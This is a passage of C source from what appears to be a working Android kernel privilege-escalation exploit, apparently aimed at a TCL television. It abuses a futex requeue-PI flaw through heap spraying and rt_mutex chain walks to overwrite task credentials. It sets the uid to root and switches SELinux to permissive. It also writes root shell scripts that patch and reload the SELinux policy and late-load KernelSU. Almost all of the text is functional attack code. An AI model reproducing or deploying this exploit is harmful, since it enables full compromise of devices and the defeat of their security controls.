  uint64_t w0_lock = *(volatile uint64_t *)(
      pg + W0_OFF + FAKE_WAITER_LOCK_OFF);
  uint64_t w0_pi_pc = *(volatile uint64_t *)(
      pg + W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF);

  int ok = lock_root == fake_w0 && lock_left == fake_w0 &&
           lock_owner == (fake_task | 1) &&
           w0_parent == 0 && w0_right == 0 && w0_left == 0 &&
           w0_task == fake_task && w0_lock == fake_lock && w0_pi_pc != 0;
  if (!ok) {
    pr_error("TCL prefire REFUSED block=%d lock[root=%016llx left=%016llx owner=%016llx] W0[parent=%016llx right=%016llx left=%016llx task=%016llx lock=%016llx pi_pc=%016llx] expected[w0=%016lx task=%016lx lock=%016lx]\n",
             g_tcl_capture_block,
             (unsigned long long)lock_root,
             (unsigned long long)lock_left,
             (unsigned long long)lock_owner,
             (unsigned long long)w0_parent,
             (unsigned long long)w0_right,
             (unsigned long long)w0_left,
             (unsigned long long)w0_task,
             (unsigned long long)w0_lock,
             (unsigned long long)w0_pi_pc,
             (unsigned long)fake_w0,
             (unsigned long)fake_task,
             (unsigned long)fake_lock);
  }
  return ok;
}

/* The owner expires naturally while the helper is provably blocked inside
 * _newselect.  Its ordinary FUTEX_LOCK_PI timeout cleanup calls
 * remove_waiter(), observes the helper waiter's stale pi_blocked_on and
 * performs the PI walk.  This avoids a signal frame on either critical
 * kernel stack. */
static void *tcl_split_verifier(void *opaque) {
  struct tcl_split_run *run = opaque;
  struct tcl_v643_mcast_shared *s = run->shared;
  disable_rseq_for_thread();
  if (!wait_atomic_nonzero(&s->round_go, 5000)) {
    atomic_fetch_add(&s->failures, 1);
    atomic_store(&s->round_done, 1);
    return NULL;
  }
  if (!atomic_load_explicit(&s->carrier_observed, memory_order_acquire)) {
    pr_error("TCL split: _newselect carrier was not observed live; refusing PI verification\n");
    atomic_fetch_add(&s->failures, 1);
    atomic_store_explicit(&s->round_done, 1, memory_order_release);
    return NULL;
  }

  if (!tcl_validate_captured_w0()) {
    atomic_fetch_add(&s->failures, 1);
    atomic_store_explicit(&s->round_done, 1, memory_order_release);
    return NULL;
  }

  uint32_t owner_tid = atomic_load_explicit(&s->owner_tid,
                                             memory_order_acquire);
  long sr = 0;
  int sched_errno = 0;
  if (!wait_atomic_nonzero(&s->owner_abort_done, 5000)) {
    pr_error("TCL owner-timeout walk failed tid=%u done=%u\n",
             owner_tid,
             atomic_load_explicit(&s->owner_abort_done,
                                  memory_order_acquire));
    atomic_fetch_add(&s->failures, 1);
    atomic_store_explicit(&s->round_done, 1, memory_order_release);
    return NULL;
  }

  uint8_t *first = uring_block(0);
  uint64_t armed = first ? *(volatile uint64_t *)(
      first + W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF) : 0;
  int found = -1;
  uint64_t cleared = page_base + W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF;
  for (int b = 0; ; b++) {
    uint8_t *pg = uring_block(b);
    if (!pg) break;
    uint64_t pc = *(volatile uint64_t *)(
        pg + W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF);
    if (pc == cleared && armed != cleared) {
      found = b;
      break;
    }
  }
  pr_info("TCL split diag: owner_timeout_wait=%ld errno=%d "
          "owner_futex_ret=%d owner_errno=%d found=%d "
          "armed=%016llx cleared=%016llx carrier_ret=%d carrier_errno=%d "
          "wait_ret=%d wait_errno=%d disarm_errno=%d\n",
          sr, sched_errno, s->diag_owner_ret, s->diag_owner_errno, found,
          (unsigned long long)armed,
          (unsigned long long)cleared, s->diag_carrier_ret,
          s->diag_carrier_errno, s->diag_wait_ret, s->diag_wait_errno,
          s->diag_disarm_errno);
  if (sr == 0 && found >= 0 && found != g_tcl_capture_block) {
    pr_error("TCL split: erase changed block %d, witness proved block %d\n",
             found, g_tcl_capture_block);
    found = -1;
  }
  if (sr == 0 && found >= 0) {
    if (pselect_custom_write == 5) {
      uint8_t *hit = uring_block(found);
      uint64_t got = *(volatile uint64_t *)(hit + SELFTEST_OFF);
      uint64_t want = page_base + SELFTEST_VALUE;
      if (got != want) {
        pr_error("TCL split: self-test write got=%016llx want=%016llx\n",
                 (unsigned long long)got, (unsigned long long)want);
        found = -1;
      }
    }
  }
  if (sr == 0 && found >= 0) {
    g_hit_block = found;
    atomic_store(&s->erase_landed, 1);
    atomic_store(&consumer_erase_hits, 1);
    g_route_write_ok = 1;
  } else {
    atomic_fetch_add(&s->failures, 1);
  }

  tcl_quiesce_payload();
  if (pselect_custom_write == WRITE_MODE_CRED_SELINUX) {
    int efd = (int)syscall(__NR_openat, AT_FDCWD,
                           "/sys/fs/selinux/enforce", O_RDONLY, 0);
    if (efd >= 0) {
      char value = '?';
      if (syscall(__NR_read, efd, &value, 1) == 1 && value == '0')
        g_selinux_off = 1;
      syscall(__NR_close, efd);
    }
  }
  atomic_store_explicit(&s->round_done, 1, memory_order_release);
  return NULL;
}

static int tcl_create_shared(struct tcl_v643_mcast_shared **out, int *out_fd) {
  int fd = (int)syscall(__NR_memfd_create, "tcl-v643-mcast", 0);
  if (fd < 0 || ftruncate(fd, sizeof(**out)) != 0) {
    if (fd >= 0) close(fd);
    return 0;
  }
  struct tcl_v643_mcast_shared *s = mmap(
      NULL, sizeof(*s), PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (s == MAP_FAILED) {
    close(fd);
    return 0;
  }
  memset(s, 0, sizeof(*s));
  s->message.magic = TCL_V643_MCAST_HELPER_MAGIC;
  s->message.version = TCL_V643_MCAST_HELPER_VERSION;
  s->message.size = sizeof(s->message);
  s->message.flags = TCL_V643_HELPER_CARRIER_NEWSELECT;
  s->message.fake_task = fake_task;
  s->message.fake_lock = fake_lock;
  s->message.wake_state = 3;
  s->message.prio = 1;
  *out = s;
  *out_fd = fd;
  return 1;
}

static int run_tcl_v643_split_route(void) {
  struct tcl_split_run run = {0};
  pthread_t owner, verifier;
  int fd = -1, status = 0;
  if (!tcl_capture_may_arm(g_tcl_capture_status, g_tcl_capture_block)) {
    pr_error("TCL split: no confirmed capture witness; refusing to create the chain\n");
    return 0;
  }
  const char *helper = getenv("TCL_MCAST_HELPER");
  if (!helper || !helper[0])
    helper = "/data/local/tmp/tcl-v643-mcast-helper";
  if (!tcl_create_shared(&run.shared, &fd)) {
    pr_error("TCL split: shared object failed errno=%d\n", errno);
    return 0;
  }

  run.helper_pid = fork();
  if (run.helper_pid == 0) {
    char fdarg[16];
    snprintf(fdarg, sizeof(fdarg), "%d", fd);
    fcntl(fd, F_SETFD, 0);
    execl(helper, helper, "--run-fd", fdarg, NULL);
    _exit(127);
  }
  if (run.helper_pid < 0 ||
      !wait_atomic_nonzero(&run.shared->helper_ready, 5000)) {
    pr_error("TCL split: AArch32 helper did not become ready\n");
    goto fail;
  }
  if (pthread_create(&owner, NULL, tcl_split_owner, &run) != 0 ||
      pthread_create(&verifier, NULL, tcl_split_verifier, &run) != 0) {
    pr_error("TCL split: coordinator thread creation failed\n");
    goto fail;
  }
  if (!wait_atomic_nonzero(&run.shared->waiter_waiting, 5000)) {
    pr_error("TCL split: helper waiter did not enter WAIT_REQUEUE_PI\n");
    goto fail_threads;
  }
  if (!wait_atomic_nonzero(&run.shared->waiter_observed, 2000)) {
    pr_error("TCL split: helper leader could not prove live WAIT_REQUEUE_PI\n");
    goto fail_threads;
  }
  pr_info("TCL split: compat waiter observed in FUTEX_WAIT_REQUEUE_PI\n");
  for (int i = 0; i < 2000 && !(run.shared->f_chain & FUTEX_WAITERS); i++)
    usleep(1000);
  if (!(run.shared->f_chain & FUTEX_WAITERS)) {
    pr_error("TCL split: owner is not queued on chain futex\n");
    goto fail_threads;
  }
  usleep((useconds_t)g_tcl_split_settle_usec);
  errno = 0;
  long rr = futex_op(&run.shared->f_wait, FUTEX_CMP_REQUEUE_PI, 1,
                     (void *)1, &run.shared->f_target, 0);
  if (rr != -1 || errno != EDEADLK) {
    pr_error("TCL split: CMP_REQUEUE_PI ret=%ld errno=%d, not armed\n",
             rr, errno);
    goto fail_threads;
  }
  atomic_store(&run.shared->bug_armed, 1);
  if (syscall(__NR_tgkill, run.helper_pid,
              (pid_t)atomic_load(&run.shared->helper_tid), SIGUSR1) != 0) {
    pr_error("TCL split: tgkill helper failed errno=%d\n", errno);
    goto fail_threads;
  }

  pthread_join(verifier, NULL);
  pthread_join(owner, NULL);
  waitpid(run.helper_pid, &status, 0);
  run.helper_pid = 0;
  int ok = WIFEXITED(status) && WEXITSTATUS(status) == 0 &&
           atomic_load(&run.shared->erase_landed) &&
           atomic_load(&run.shared->handler_done) &&
           atomic_load(&run.shared->cleanup_done) &&
           !atomic_load(&run.shared->failures);
  pr_info("TCL split: erase=%u handler=%u cleanup=%u status=%d failures=%u\n",
          atomic_load(&run.shared->erase_landed),
          atomic_load(&run.shared->handler_done),
          atomic_load(&run.shared->cleanup_done), status,
          atomic_load(&run.shared->failures));
  munmap(run.shared, sizeof(*run.shared));
  close(fd);
  return ok;

fail_threads:
  atomic_fetch_add(&run.shared->failures, 1);
  atomic_store(&run.shared->round_done, 1);
fail:
  if (run.helper_pid > 0) {
    kill(run.helper_pid, SIGKILL);
    waitpid(run.helper_pid, NULL, 0);
  }
  munmap(run.shared, sizeof(*run.shared));
  close(fd);
  return 0;
}

void run_main_route_threads(void) {
  reset_main_route_state();
  if (active_offsets &&
      active_offsets->stack_overlay_route ==
          GHOST_STACK_OVERLAY_TCL_V643_NEWSELECT_COMPAT) {
    if (!run_tcl_v643_split_route()) {
      g_route_write_ok = 0;
      return;
    }
    if (pselect_custom_write == WRITE_MODE_CRED &&
        !g_tcl_external_cred_target) {
      long gr = syscall(__NR_setresgid, 0, 0, 0);
      long ur = syscall(__NR_setresuid, 0, 0, 0);
      if (gr != 0 || ur != 0 || syscall(__NR_getuid) != 0) {
        pr_error("TCL split: credential normalization failed gid=%ld uid=%ld errno=%d\n",
                 gr, ur, errno);
        g_route_write_ok = 0;
      }
    }
    atomic_store(&consumer_walks_done, 1);
    return;
  }
  /* Install the in-handler overlay route (walk-before-cleanup): the
   * handler runs on whichever thread receives the thread-directed
   * SIGUSR1 (main sends it to the waiter tid right after the CMP_REQUEUE_PI
   * arms the bug). See ghost_usr1_handler() in fops.c. */
  {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = ghost_usr1_handler;
    sigemptyset(&sa.sa_mask);
    sigaddset(&sa.sa_mask, SIGUSR1); /* block re-entry inside the handler */
    sa.sa_flags = SA_RESTART;
    sigaction(SIGUSR1, &sa, NULL);
  }
  pthread_t waiter, owner, consumer;
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));
  while (!atomic_load(&waiter_waiting) ||
         !atomic_load(&owner_chain_entered))
    usleep(1000);

  /* owner_started used to be followed only by a fixed 50 ms delay.  That
   * left a real scheduling race: CMP_REQUEUE_PI could run before the owner
   * was enqueued on f_pi_chain, in which case the post-enqueue chain walk
   * had no cycle to detect.  FUTEX_LOCK_PI publishes FUTEX_WAITERS in the
   * user word after the contending owner is queued.  Require that observable
   * state before requeueing the proxy waiter.  The waiter-side queue has no
   * equivalent user-word bit, so retain a short settle after this proof. */
  {
    struct timespec start, now;
    int chain_queued = 0;
    clock_gettime(CLOCK_MONOTONIC, &start);
    do {
      uint32_t chain_word = __atomic_load_n(&f_pi_chain, __ATOMIC_ACQUIRE);
      if (chain_word & FUTEX_WAITERS) {
        chain_queued = 1;
        break;
      }
      usleep(1000);
      clock_gettime(CLOCK_MONOTONIC, &now);
    } while ((now.tv_sec - start.tv_sec) < 2);

    if (!chain_queued) {
      pr_error("owner was not queued on f_pi_chain; refusing CMP_REQUEUE_PI\n");
      return;
    }
  }
  usleep(50000);
  errno = 0;
  {
    long rr = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
    int re = errno;
    printf("[TRIG] main CMP_REQUEUE_PI ret=%ld errno=%d (EDEADLK=%d means cycle hit)\n",
           rr, re, rr == -EDEADLK);
    /* Walk-before-cleanup restructure: with the CVE armed (the EDEADLK
     * rollback in rt_mutex_start_proxy_lock -> remove_waiter cleared
     * CURRENT's pi_blocked_on, not the waiter task's -- so the waiter
     * task's pi_blocked_on now dangles at the rt_mutex_waiter inside its
     * STILL RUNNING FUTEX_WAIT_REQUEUE_PI syscall), signal the waiter.
     *
     * The futex returns -ERESTARTNOINTR (kernel-internal), the SIGUSR1
     * handler runs the profile-selected overlay route on the waiter's kernel
     * stack at the exact same syscall-entry depth, the consumer fires the
     * PI chain walks against that overlay while its carrier blocks, and only
     * then does the handler return -- the futex
     * restarts, times out immediately against its original absolute
     * deadline, and its ETIMEDOUT cleanup path runs over the QUIESCED
     * spray page (it only takes hb->lock and plist_del's the futex_q;
     * it can never contend a page spinlock). */
    if (ghost_signal_route_enabled() && rr == -1 && re == EDEADLK) {
      atomic_store(&ghost_bug_armed, 1);
      int wtid = atomic_load(&waiter_tid);
      long kr = syscall(SYS_tgkill, getpid(), wtid, SIGUSR1);
      printf("[TRIG] main SIGUSR1 -> waiter tid=%d ret=%ld (overlay route fires in-handler)\n",
             wtid, kr);
    }
  }
  reset_cpu_pin();
  if (write_mode_is_cred(pselect_custom_write)) {
    /* Wait for consumer to finish ALL planned walks (budget=1 per round
     * means one overlay round per planned erase - 3 rounds for mode 7,
     * each costing the 3 s SO_SNDTIMEO of its overlay sendmsg). Only then
     * poll getuid -- the uid repair in the quiesce happens after the
     * last erase, and the old 15 s poll could expire before the final
     * round could fire. Raw syscalls only: past this point the walks
     * may have wedged libc for the MAIN thread (see HANDOVER_2 - the
     * old pr_info after the cred swap deadlocked). */
    {
      static const char w0[] = "[DBG] main: entering wait loop\n";
      syscall(__NR_write, 1, w0, sizeof(w0) - 1);
      struct timespec wd;
      clock_gettime(CLOCK_MONOTONIC, &wd);
      int ticks = 0;
      while (!atomic_load(&consumer_walks_done)) {
        struct timespec wn;
        clock_gettime(CLOCK_MONOTONIC, &wn);
        long elapsed = wn.tv_sec - wd.tv_sec;
        if (elapsed >= 30) break;
        if (++ticks % 5000000 == 0) {
          static const char wp[] = "[DBG] main: waiting... hits=";
          syscall(__NR_write, 1, wp, sizeof(wp) - 1);
          char tb[16]; int tl = 0;
          int h = atomic_load(&consumer_erase_hits);
          if (h == 0) tb[tl++] = '0';
          else { if (h >= 10) tb[tl++] = '0' + h/10; tb[tl++] = '0' + h%10; }
          syscall(__NR_write, 1, tb, tl);
          static const char tn[] = "\n";
          syscall(__NR_write, 1, tn, 1);
        }
        __asm__ volatile("yield" ::: "memory");
      }
      int done = atomic_load(&consumer_walks_done);
      static const char w1[] = "[DBG] main: wait done, walks_done=";
      syscall(__NR_write, 1, w1, sizeof(w1) - 1);
      char db[4]; db[0] = '0' + done; db[1] = '\n';
      syscall(__NR_write, 1, db, 2);
      syscall(__NR_fsync, 1);
      /* Settle before the first post-swap syscalls: the in-handler route
       * may still be inside its round-N sendmsg (SO_SNDTIMEO ~3s); when
       * it returns, the waiter's futex restarts and its ETIMEDOUT cleanup
       * runs over the quiesced spray page, then the consumer exits. Doing
       * that unwind with no concurrent main-thread activity removes one
       * crash window (observed: device died post-walks_done before this
       * delay existed). */
      if (g_settle_ms > 0 && done) {
        struct timespec st;
        st.tv_sec = g_settle_ms / 1000;
        st.tv_nsec = (long)(g_settle_ms % 1000) * 1000000L;
        syscall(__NR_nanosleep, &st, NULL);
      }
    }
    uint32_t uid_orig = 2000;
    uint32_t uid_now = syscall(__NR_getuid);
    {
      static const char u0[] = "[DBG] main: getuid=";
      syscall(__NR_write, 1, u0, sizeof(u0) - 1);
      char ub[16]; int ul = 0;
      unsigned long uv = uid_now;
      if (uv == 0) { ub[ul++] = '0'; }
      else { char tmp[12]; int ti = 0; while (uv) { tmp[ti++] = '0' + uv%10; uv /= 10; } while (ti) ub[ul++] = tmp[--ti]; }
      syscall(__NR_write, 1, ub, ul);
      static const char u1[] = "\n";
      syscall(__NR_write, 1, u1, 1);
    }
    g_route_write_ok = (uid_now != uid_orig);
    /* Raw readback of the SELinux enforcing flag (readable by the shell
     * context since boot, so this works no matter which cred we hold).
     * "0" here is the on-device proof that the mode-7 plan-0 zero-write
     * hit the real selinux_state. */
    {
      long ef = syscall(__NR_openat, AT_FDCWD,
                        "/sys/fs/selinux/enforce", O_RDONLY, 0);
      if (ef >= 0) {
        char eb[16];
        long en = syscall(__NR_read, ef, eb, sizeof(eb) - 1);
        syscall(__NR_close, ef);
        int eoff = (en > 0 && eb[0] == '0');
        if (eoff) g_selinux_off = 1;
        static const char pre[] = "[SELINUX] main: enforce=";
        syscall(__NR_write, 1, pre, sizeof(pre) - 1);
        if (en > 0) syscall(__NR_write, 1, eb, en);
        if (eoff) {
          static const char ok[] = " -> SELinux OFF\n";
          syscall(__NR_write, 1, ok, sizeof(ok) - 1);
        } else {
          static const char no[] = "\n";
          syscall(__NR_write, 1, no, sizeof(no) - 1);
        }
      }
    }
  } else {
    while (!atomic_load_explicit(&route_done, memory_order_acquire))
      __asm__ volatile("yield" ::: "memory");
  }
}

static int do_one_write(uintptr_t target, const char *desc, int mode) {
  pr_info("=== %s === target=0x%016zx mode=%d\n", desc, target, mode);
  ghost_reset_plans();
  g_route_write_ok = 0;
  pselect_child_node = 1;
  set_pselect_write_mode(target,
                         mode == WRITE_MODE_CRED_SELINUX
                             ? g_selinux_stamp_value : 0,
                         mode);
  TIMER("  heap spray start");
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
  if (!page_base) {
    /* A guarded TCL capture refusal is non-fatal: return through
     * run_cred_swap() so its original-shell relay is stopped and reaped.
     * pr_error() exits the process immediately and would orphan it. */
    pr_warning("  heap spray failed or was refused by the capture gate\n");
    clear_pselect_write();
    return 0;
  }
  if (mode == 6 && (!active_offsets ||
      active_offsets->reclaim_route != GHOST_RECLAIM_TCL_V643_EXACT)) {
    /* Walk 0: cred. Plan: walk 1 targets real_cred (= target - 8). */
    ghost_push_plan(pselect_custom_target - 8, page_base + FAKE_CRED_OFF);
    pr_info("  walk0: cred, walk1: real_cred, fake_cred=%016zx plans=%d\n",
            page_base + FAKE_CRED_OFF, ghost_plan_count());
  }
  if (mode == WRITE_MODE_CRED_SELINUX && (!active_offsets ||
      active_offsets->reclaim_route != GHOST_RECLAIM_TCL_V643_EXACT)) {
    /* Plan 0 is baked into the payload by prepare_skb_payload as the
     * selinux zero-write (W0.pi_tree = {pc=(selinux-8)|1, right=0,
     * left=0}). Push the two cred plans for the following overlay
     * rounds: cred first (getuid/exec read task->cred), then real_cred
     * (commit_creds at exec BUG_ONs unless cred == real_cred, so both
     * pointer writes are required before any execve). Three erases fit
     * the three rungs of the nice ladder: 0->7, 7->14, 14->19. */
    ghost_push_plan(g_leaked_task + TASK_CRED_OFF,
                    page_base + FAKE_CRED_OFF);
    ghost_push_plan(g_leaked_task + TASK_REAL_CRED_OFF,
                    page_base + FAKE_CRED_OFF);
    pr_info("  walk0: selinux zero, walk1: cred, walk2: real_cred, "
            "fake_cred=%016zx plans=%d\n",
            page_base + FAKE_CRED_OFF, ghost_plan_count());
  }
  TIMER("  heap spray done");
  run_main_route_threads();
  clear_pselect_write();
  return 1;
}

/* Reuse the page already captured and pinned by the TCL W2 credential
 * write.  Starting a second mm_struct reclaim after a live raw-root victim
 * exists proved unsafe on the television: the extra SLUB churn can panic
 * before the second write is even armed.  The split AArch32 carrier is
 * deliberately one-erase-per-lifetime, so create a fresh carrier but only
 * re-arm the quiesced waiter/lock fields in the existing io_uring mapping.
 * Do not rebuild the full payload: the fake credential on this page is live
 * in the W2 victim and must retain its reference state. */
static int do_tcl_reuse_captured_write(uintptr_t target, uintptr_t value,
                                       const char *desc, int mode) {
  pr_info("=== %s (reuse captured W2 page) === target=0x%016zx mode=%d\n",
          desc, target, mode);
  ghost_reset_plans();
  g_route_write_ok = 0;
  pselect_child_node = 1;
  set_pselect_write_mode(target, value, mode);
  int attempts = env_int_range("TCL_REUSE_ATTEMPTS", 3, 1, 5);
  int force_retry = env_flag("TCL_REUSE_FORCE_RETRY", 0);
  for (int attempt = 1; attempt <= attempts; attempt++) {
    g_route_write_ok = 0;
    if (!ghost_rearm_captured_write(target, value)) {
      pr_warning("TCL same-page re-arm failed attempt=%d/%d\n",
                 attempt, attempts);
      break;
    }
    pr_info("TCL same-page carrier attempt=%d/%d settle_us=%d\n",
            attempt, attempts, 50000 + (attempt - 1) * 30000);
    TIMER("  captured page re-armed");
    /* A fresh compat helper is used for every attempt.  No reclaim and no
     * new kernel allocation target are introduced: a clean carrier miss is
     * allowed to unwind completely, then the quiesced captured page is
     * re-armed.  The increasing settle only changes when the already armed
     * PI chain receives its signal. */
    g_tcl_split_settle_usec = 50000 + (attempt - 1) * 30000;
    run_main_route_threads();
    if (g_route_write_ok) {
      if (force_retry && attempt == 1) {
        pr_info("TCL same-page forced retry gate: first landing accepted "
                "then re-armed for regression\n");
        g_route_write_ok = 0;
        continue;
      }
      break;
    }
    pr_warning("TCL same-page carrier miss attempt=%d/%d; retrying "
               "without reclaim\n", attempt, attempts);
  }
  g_tcl_split_settle_usec = 50000;
  clear_pselect_write();
  return g_route_write_ok;
}

static int check_selinux_off(void) {
  int efd = open("/sys/fs/selinux/enforce", O_RDONLY);
  if (efd < 0) return 1;
  char b[4] = {0};
  read(efd, b, sizeof(b));
  close(efd);
  return b[0] == '0';
}

/* Post-root fail-safe used by the direct broker handoff.  Keep this path
 * libc-free: the exploit threads may still own inconsistent libc locks.
 * The broker normally restores enforcing as soon as the manager app
 * connects; if that handshake never happens, the root parent closes the
 * permissive window itself before exiting. */
static int raw_selinux_enforcing(void) {
  long fd = syscall(__NR_openat, AT_FDCWD,
                    "/sys/fs/selinux/enforce", O_RDONLY, 0);
  if (fd < 0) return -1;
  char value = '?';
  long n = syscall(__NR_read, fd, &value, 1);
  syscall(__NR_close, fd);
  return n == 1 ? (value == '1') : -1;
}

/* Once the preserving rb_erase write has made SELinux permissive, a plain
 * setenforce(1) is unsafe: the same eight-byte store temporarily replaces
 * policycap[0..4].  Only a normalized helper may reload and verify the live
 * policy before closing the window.  A raw-task failure therefore reboots;
 * if reboot is unavailable it parks forever and keeps the reclaimed page
 * pinned instead of enabling enforcement with corrupted network policy. */
static void raw_emergency_reboot_or_park(void) {
  (void)syscall(__NR_sync);
  (void)syscall(__NR_reboot, LINUX_REBOOT_MAGIC1, LINUX_REBOOT_MAGIC2,
                LINUX_REBOOT_CMD_RESTART, NULL);
  for (;;) {
    struct timespec pause = {.tv_sec = 3600, .tv_nsec = 0};
    (void)syscall(__NR_nanosleep, &pause, NULL);
  }
}

static int write_selinux_policy_fix_script(void) {
  static const char fix_script[] =
    "#!/system/bin/sh\n"
    "P=/sys/fs/selinux/policy\n"
    "L=/sys/fs/selinux/load\n"
    "T=/data/local/tmp/.ghostlock_policy.bin\n"
    "LOG=/data/local/tmp/.ghostlock_policy.log\n"
    "exec >>$LOG 2>&1\n"
    "echo \"[*] policy fix: uid=$(id -u) enforce=$(cat /sys/fs/selinux/enforce 2>/dev/null)\"\n"
    "cp $P $T || { echo '[!] policy fix: policy copy failed'; exit 1; }\n"
    "SZ=$(wc -c < $T)\n"
    "[ \"$SZ\" -gt 20 ] || { echo \"[!] policy fix: policy too short ($SZ bytes)\"; exit 1; }\n"
    "ID_LEN=$(dd if=$T bs=1 skip=4 count=4 2>/dev/null | od -A n -t u4 | tr -d ' ')\n"
    "CO=$((4 + 4 + ID_LEN + 4))\n"
    "CFG=$(dd if=$T bs=1 skip=$CO count=4 2>/dev/null | od -A n -t u4 | tr -d ' ')\n"
    "NEW=$(( CFG | 0xC0000000 ))\n"
    "if [ \"$NEW\" != \"$CFG\" ]; then\n"
    "  printf '\\\\x%02x\\\\x%02x\\\\x%02x\\\\x%02x' "
      "$((NEW & 0xFF)) $(((NEW>>8) & 0xFF)) $(((NEW>>16) & 0xFF)) $(((NEW>>24) & 0xFF))"
      " | dd of=$T bs=1 seek=$CO conv=notrunc 2>/dev/null\n"
    "  echo \"[*] policy fix: config=$CFG -> $NEW at offset=$CO (netlink flags restored)\"\n"
    "else\n"
    "  echo \"[*] policy fix: config=$CFG at offset=$CO (already has netlink flags)\"\n"
    "fi\n"
    "# /sys/fs/selinux/load accepts the complete policy in one write only.\n"
    "if dd if=$T of=$L bs=$SZ count=1; then\n"
    "  echo '[+] policy fix: policy load succeeded'\n"
    "  rm -f $T\n"
    "  exit 0\n"
    "fi\n"
    "echo '[!] policy fix: policy load failed'\n"
    "rm -f $T\n"
    "exit 1\n";
  int sfd = open("/data/local/tmp/.ghostlock_fixpol.sh", O_WRONLY | O_CREAT | O_TRUNC, 0755);
  if (sfd < 0) {
    pr_info("fix_policy: write script failed errno=%d\n", errno);
    return 0;
  }
  ssize_t wrote = write(sfd, fix_script, strlen(fix_script));
  close(sfd);
  if (wrote != (ssize_t)strlen(fix_script)) {
    pr_info("fix_policy: script write failed ret=%zd errno=%d\n", wrote, errno);
    return 0;
  }
  return 1;
}

static int kernelsu_module_loaded(void) {
  int fd = open("/proc/modules", O_RDONLY);
  if (fd < 0) return 0;

  char modules[8192] = {0};
  ssize_t n = read(fd, modules, sizeof(modules) - 1);
  close(fd);
  return n > 0 && strstr(modules, "kernelsu ") != NULL;
}

static int wait_for_ksu_status(void) {
  static const char status_path[] = "/data/local/tmp/.ghostlock_ksu.status";

  for (int attempt = 1; attempt <= 40; attempt++) {
    /* The late-load helper can be replaced or blocked as the module comes
     * online. /proc/modules is observable from this original shell and is
     * therefore the authoritative readiness signal. */
    if (kernelsu_module_loaded()) {
      pr_success("KernelSU module is loaded\n");
      return 0;
    }

    char status[128] = {0};
    int fd = open(status_path, O_RDONLY);
    if (fd >= 0) {
      ssize_t n = read(fd, status, sizeof(status) - 1);
      close(fd);
      if (n > 0) {
        status[strcspn(status, "\r\n")] = '\0';
        if (!strcmp(status, "ready")) {
          pr_success("KernelSU helper reports ready\n");
          return 0;
        }
        if (!strncmp(status, "failed:", 7)) {
          pr_error("KernelSU helper reports %s; see .ghostlock_root.log and .ghostlock_ksud.log\n",
                   status);
          return 1;
        }
      }
    }
    if (attempt == 1 || attempt % 10 == 0) {
      pr_info("waiting for KernelSU helper status (%d/40)\n", attempt);
    }
    sleep(1);
  }

  pr_error("KernelSU helper did not report readiness; see .ghostlock_root.log and .ghostlock_ksud.log\n");
  return 1;
}

static void slab_drain(void) {
  struct timespec up;
  clock_gettime(CLOCK_BOOTTIME, &up);
  int waves = (up.tv_sec > 60) ? 5 : 2;
  int batch = (up.tv_sec > 60) ? 400 : 200;
  for (int wave = 0; wave < waves; wave++) {
    pid_t *drain = calloc(batch, sizeof(pid_t));
    int n = 0;
    for (int i = 0; i < batch; i++) {
      drain[i] = fork();
      if (drain[i] == 0) { pause(); _exit(0); }
      if (drain[i] > 0) n++;
    }
    for (int i = 0; i < n; i++) {
      kill(drain[i], SIGKILL);
      waitpid(drain[i], NULL, 0);
    }
    free(drain);
    sched_yield();
  }
}

static void write_root_script(void) {
  int sfd = open("/data/local/tmp/.ghostlock_root.sh", O_WRONLY|O_CREAT|O_TRUNC, 0755);
  if (sfd < 0) return;
  int policy_script_ready = write_selinux_policy_fix_script();
  unlink("/data/local/tmp/.ghostlock_ksu.status");
  const char *script =
    "#!/system/bin/sh\n"
    "ROOT_LOG=/data/local/tmp/.ghostlock_root.log\n"
    "STATUS=/data/local/tmp/.ghostlock_ksu.status\n"
    "diag() { echo \"$*\"; echo \"$*\" >>$ROOT_LOG; }\n"
    "report_status() { printf '%s\\n' \"$1\" >$STATUS; }\n"
    "report_status pending\n"
    "diag '[+] root shell pid='$$' uid='$(id -u)\n"
    "if [ -x /data/local/tmp/.ghostlock_fixpol.sh ]; then\n"
    "  diag '[*] repairing SELinux policy before KernelSU'\n"
    "  if /system/bin/sh /data/local/tmp/.ghostlock_fixpol.sh; then\n"
    "    diag '[+] early SELinux policy repair succeeded'\n"
    "    diag '[*] keeping SELinux permissive until KernelSU is ready'\n"
    "  else\n"
    "    diag '[!] early SELinux policy repair failed; see .ghostlock_policy.log'\n"
    "  fi\n"
    "  rm -f /data/local/tmp/.ghostlock_fixpol.sh\n"
    "else\n"
    "  diag '[!] policy repair script was not created'\n"
    "fi\n"
    "KSUD=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
    "if [ -z \"$KSUD\" ]; then KSUD=/data/adb/ksu/bin/ksud; fi\n"
    "KSU_READY=0\n"
    "if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
    "  diag '[+] KernelSU already loaded'\n"
    "  KSU_READY=1\n"
    "elif [ -x \"$KSUD\" ] || [ -f \"$KSUD\" ]; then\n"
    "  diag '[*] ksud:' $KSUD\n"
    "  chmod 755 \"$KSUD\" 2>/dev/null\n"
    "  KVER=$(uname -r | cut -d. -f1-2)\n"
    "  AVER=$(uname -r | grep -o 'android[0-9]*')\n"
    "  KMI=\"${AVER}-${KVER}\"\n"
    "  diag '[*] KMI=' $KMI\n"
    "  mkdir -p /data/adb/ksu 2>/dev/null\n"
    "  diag '[*] ksud late-load --kmi' $KMI\n"
    "  KSUD_LOG=/data/local/tmp/.ghostlock_ksud.log\n"
    "  rm -f \"$KSUD_LOG\"\n"
    "  setsid \"$KSUD\" late-load --kmi \"$KMI\" </dev/null >\"$KSUD_LOG\" 2>&1 &\n"
    "  KSUD_PID=$!\n"
    "  diag '[*] ksud pid='$KSUD_PID\n"
    "  KSUD_EXITED=0\n"
    "  for w in $(seq 1 30); do\n"
